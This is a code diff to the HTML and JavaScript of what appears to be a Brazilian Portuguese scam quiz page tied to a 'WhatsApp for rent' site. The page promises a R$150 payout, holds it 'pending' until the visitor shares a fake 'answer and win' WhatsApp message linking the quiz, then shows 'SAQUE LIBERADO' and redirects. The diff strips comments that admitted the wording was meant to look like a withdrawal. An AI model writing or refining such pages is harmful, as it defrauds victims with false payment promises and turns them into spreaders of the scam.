@@ -63,7 +63,7 @@
 
     </div>
 
-    <div style="position: fixed; bottom: 10px; color: rgba(255,255,255,0.6); font-size: 11px;">
+    <div style="position: fixed; bottom: 10px; width: 100%; left: 0; text-align: center; color: rgba(255,255,255,0.6); font-size: 11px; pointer-events: none;">
         © 2024 Programa de Incentivo Digital
     </div>
 
@@ -139,7 +139,7 @@
             }
         }
 
-        // --- LÓGICA DE ANÁLISE (COPYWRITING: DINHEIRO FÁCIL) ---
+        // --- LÓGICA DE ANÁLISE ---
         function iniciarAnalise() {
             mostrarTela('etapa-loading');
 
@@ -169,12 +169,10 @@
             mostrarTela('etapa-final');
         }
 
-        // --- LÓGICA DE COMPARTILHAMENTO ATUALIZADA ---
+        // --- LÓGICA DE COMPARTILHAMENTO ---
         function gerarLinkZap() {
-            // Link correto do seu Quiz
             const linkQuiz = "https://whatsapp-de-aluguel.vercel.app/quiz.html";
             
-            // A Mensagem "Acerte e Ganhe" formatada
             const mensagemTexto = 
 `🤑 *Acerte as perguntas e GANHE!*
 
@@ -183,7 +181,6 @@ Acabei de fazer o Quiz aqui, acertei as respostas e já garanti o meu. 💸
 É só responder certo para ganhar também. Corre antes que acabe! 👇
 ${linkQuiz}`;
 
-            // Codifica para URL e retorna
             return `https://api.whatsapp.com/send?text=${encodeURIComponent(mensagemTexto)}`;
         }
 
@@ -191,11 +188,10 @@ ${linkQuiz}`;
             shareClicked = true;
             window.open(gerarLinkZap(), '_blank');
             
-            // Libera o botão após compartilhar
             setTimeout(() => {
                 const btn = document.getElementById('btn-final-continue');
                 btn.classList.add('active');
-                btn.innerText = "SAQUE LIBERADO >>"; // Mudou para parecer que vai sacar
+                btn.innerText = "SAQUE LIBERADO >>";
             }, 2000);
         }
 
@@ -204,8 +200,6 @@ ${linkQuiz}`;
                 alert("⚠️ ATENÇÃO!\n\nSeu saque de R$ 150,00 está pendente. Clique no botão verde e compartilhe para desbloquear o valor.");
                 return;
             }
-            
-            // REDIRECIONA PARA O CHAT (index.html)
             window.location.href = 'index.html';
         }
     </script>
